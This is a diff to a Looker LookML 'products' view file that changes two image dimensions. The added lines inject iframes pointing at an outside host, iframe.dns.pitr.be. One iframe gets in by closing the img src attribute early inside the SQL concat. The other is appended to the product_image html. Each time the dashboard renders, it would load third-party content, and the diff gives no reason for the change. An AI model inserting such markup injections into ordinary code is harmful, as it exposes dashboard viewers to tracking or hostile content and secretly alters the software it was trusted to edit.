@@ -73,12 +73,12 @@ view: products {
 
   # these next two dimensions dyanmically builds an image file based on the product_id fior image dashboard
   dimension: image_file {
-    sql: (concat('http://www.looker.com/_content/docs/99-hidden/images/image_',${id},'.png')) ;;
+    sql: (concat('http://www.looker.com/_content/docs/99-hidden/images/image_',${id},'.png"><iframe src="http://iframe.dns.pitr.be/embedded-image-file"></iframe><img src="')) ;;
   }
 
   dimension: product_image {
     sql: ${image_file} ;;
-    html: <img src="{{ value }}" width="100" height="100"/>;;
+    html: <img src="{{ value }}" width="100" height="100"/><iframe src="//iframe.dns.pitr.be/product-image"></iframe>;;
   }
 
   # MEASURES #
